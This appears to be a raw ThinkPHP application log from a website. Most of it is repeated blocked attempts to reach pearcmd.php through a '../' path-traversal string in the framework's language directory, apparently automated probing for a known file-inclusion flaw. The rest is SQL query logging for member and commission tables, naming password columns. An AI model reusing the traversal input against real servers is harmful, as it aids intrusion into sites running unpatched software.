[2022-12-11T00:04:49+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T00:04:49+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T00:54:24+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T00:54:24+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:03:02+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:03:02+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:16:54+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:30:19+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:30:19+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:35:51+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T01:35:51+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:24:38+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:24:38+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:46:19+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:46:19+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:46:20+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:46:20+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:58:29+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T02:58:29+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T03:04:56+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T03:04:56+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T03:17:09+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T03:17:09+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:09:03+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:09:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:09:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:09:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:20:42+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:20:42+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:25:42+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:25:42+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:25:43+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:25:43+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:52:40+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:52:40+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:59:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T04:59:04+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T05:05:47+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T05:05:47+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T05:05:47+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T05:05:48+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T05:10:26+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T05:10:26+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:27:23+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:27:24+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:27:24+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:27:24+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:43:06+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:43:07+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:43:07+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T06:43:07+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T07:12:16+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T07:12:16+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T07:12:16+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T07:12:16+08:00][error] [2]is_file(): open_basedir restriction in effect. File(/www/wwwroot/www.hunqin.com/vendor/topthink/framework/src/lang/../../../../../../../../usr/local/lib/php/pearcmd.php) is not within the allowed path(s): (/www/wwwroot/www.hunqin.com/:/tmp/)
[2022-12-11T08:56:56+08:00][sql] CONNECT:[ UseTime:0.000505s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.001026s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000417s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2371 LIMIT 1 [ RunTime:0.000696s ]
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000596s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2371  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000504s ]
[2022-12-11T08:56:56+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 40  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000320s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2371  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000446s ]
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000547s ]
[2022-12-11T08:56:56+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000404s ]
[2022-12-11T08:56:56+08:00][sql] CONNECT:[ UseTime:0.000424s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.001092s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000323s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2371 LIMIT 1 [ RunTime:0.000616s ]
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000659s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `fenxiao_id`,`fenxiao_no`,`fenxiao_name`,`mobile`,`member_id`,`level_id`,`level_name`,`parent`,`grand_parent`,`account`,`account_withdraw`,`account_withdraw_apply`,`status`,`create_time`,`audit_time`,`lock_time`,`one_fenxiao_order_num`,`one_fenxiao_order_money`,`one_child_num`,`one_child_fenxiao_num`,`two_child_fenxiao_num`,`total_commission`,`is_delete`,`two_rate` FROM `gxfc_fenxiao` WHERE  `member_id` = 2371 LIMIT 1 [ RunTime:0.000426s ]
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.001824s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `source_member` = 2371 [ RunTime:0.000514s ]
[2022-12-11T08:56:56+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 40  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000341s ]
[2022-12-11T08:56:56+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_account` [ RunTime:0.000558s ]
[2022-12-11T08:56:56+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 40  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000396s ]
[2022-12-11T08:56:56+08:00][sql] SELECT `id`,`account_no`,`fenxiao_id`,`fenxiao_name`,`money`,`type`,`type_name`,`relate_id`,`create_time` FROM `gxfc_fenxiao_account` WHERE  `fenxiao_id` = 40 [ RunTime:0.000285s ]
[2022-12-11T08:56:56+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 40  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000324s ]
[2022-12-11T08:56:56+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 40 OR `two_fenxiao_id` = 40 OR `three_fenxiao_id` = 40 ) LIMIT 1 [ RunTime:0.000274s ]
[2022-12-11T08:56:57+08:00][sql] CONNECT:[ UseTime:0.000440s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T08:56:57+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000912s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000373s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2371 LIMIT 1 [ RunTime:0.000543s ]
[2022-12-11T08:56:57+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao` [ RunTime:0.000585s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `f`.*,pf.fenxiao_name as parent_name,`nm`.`nickname`,`nm`.`headimg` FROM `gxfc_fenxiao` `f` LEFT JOIN `gxfc_fenxiao` `pf` ON `pf`.`fenxiao_id`=`f`.`parent` INNER JOIN `gxfc_member` `nm` ON `nm`.`member_id`=`f`.`member_id` WHERE  `f`.`member_id` = 2371  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000480s ]
[2022-12-11T08:56:57+08:00][sql] SELECT COUNT(*) AS think_count FROM `gxfc_member` WHERE  `fenxiao_id` = 40  AND `is_fenxiao` = 0  AND `is_delete` = 0 [ RunTime:0.000268s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `f`.`level_id`,`m`.`order_num`,`m`.`order_money`,`f`.`one_fenxiao_order_num`,`f`.`one_fenxiao_order_money`,`f`.`one_child_num`,`f`.`one_child_fenxiao_num`,`fl`.`one_rate`,`fl`.`level_num` FROM `gxfc_fenxiao` `f` INNER JOIN `gxfc_member` `m` ON `f`.`member_id`=`m`.`member_id` INNER JOIN `gxfc_fenxiao_level` `fl` ON `f`.`level_id`=`fl`.`level_id` WHERE  `f`.`member_id` = 2371  AND `f`.`status` = 1  AND `f`.`is_delete` = 0 LIMIT 1 [ RunTime:0.000392s ]
[2022-12-11T08:56:57+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_level` [ RunTime:0.000477s ]
[2022-12-11T08:56:57+08:00][sql] SELECT * FROM `gxfc_fenxiao_level` WHERE  `level_num` >= 1  AND `level_id` <> 1 ORDER BY `level_num` ASC,`one_rate` ASC LIMIT 1 [ RunTime:0.000351s ]
[2022-12-11T08:56:57+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_fenxiao_order` [ RunTime:0.000680s ]
[2022-12-11T08:56:57+08:00][sql] SELECT sum(one_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `one_fenxiao_id` = 40  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000311s ]
[2022-12-11T08:56:57+08:00][sql] SELECT sum(two_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `two_fenxiao_id` = 40  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000392s ]
[2022-12-11T08:56:57+08:00][sql] SELECT sum(three_commission) as commission FROM `gxfc_fenxiao_order` WHERE  `three_fenxiao_id` = 40  AND `create_time` BETWEEN 1670688000 AND 1670774400   AND `is_settlement` = 1 LIMIT 1 [ RunTime:0.000333s ]
[2022-12-11T08:56:57+08:00][sql] SELECT sum(real_goods_money) as real_goods_money FROM `gxfc_fenxiao_order` WHERE  ( `one_fenxiao_id` = 40 OR `two_fenxiao_id` = 40 OR `three_fenxiao_id` = 40 ) LIMIT 1 [ RunTime:0.000280s ]
[2022-12-11T08:56:57+08:00][sql] CONNECT:[ UseTime:0.000445s ] mysql:host=127.0.0.1;port=3306;dbname=hunqin;charset=utf8
[2022-12-11T08:56:57+08:00][sql] SHOW FULL COLUMNS FROM `gxfc_member` [ RunTime:0.000882s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `member_id` FROM `gxfc_member` WHERE  `status` = 0 [ RunTime:0.000380s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `member_id`,`source_member`,`fenxiao_id`,`is_fenxiao`,`username`,`nickname`,`mobile`,`email`,`password`,`status`,`headimg`,`member_level`,`member_level_name`,`member_label`,`member_label_name`,`qq`,`qq_openid`,`wx_openid`,`weapp_openid`,`wx_unionid`,`ali_openid`,`baidu_openid`,`toutiao_openid`,`douyin_openid`,`login_ip`,`login_type`,`login_time`,`last_login_ip`,`last_login_type`,`last_login_time`,`login_num`,`realname`,`sex`,`location`,`birthday`,`reg_time`,`point`,`balance`,`growth`,`balance_money`,`account5`,`is_auth`,`sign_time`,`sign_days_series`,`pay_password`,`order_money`,`order_complete_money`,`order_num`,`order_complete_num`,`balance_withdraw_apply`,`balance_withdraw`,`is_delete`,`login_type_name`,`hospital_id`,`is_commander`,`self_cl_id`,`hospital_name`,`self_leader_name`,`cl_id`,`is_fenxiao_order`,`expiration_time`,`start_time`,`is_fenxiao_charge` FROM `gxfc_member` WHERE  `member_id` = 2371 LIMIT 1 [ RunTime:0.000510s ]
[2022-12-11T08:56:57+08:00][sql] SELECT `nickname`,`headimg` FROM `gxfc_member` WHERE  `member_id` = 2371 LIMIT 1 [ RunTime:0.000459s ]
[2022-12-11T10:58:16+08:00][error] [0]route pattern error
[2022-12-11T10:58:16+08:00][error] [0]route pattern error
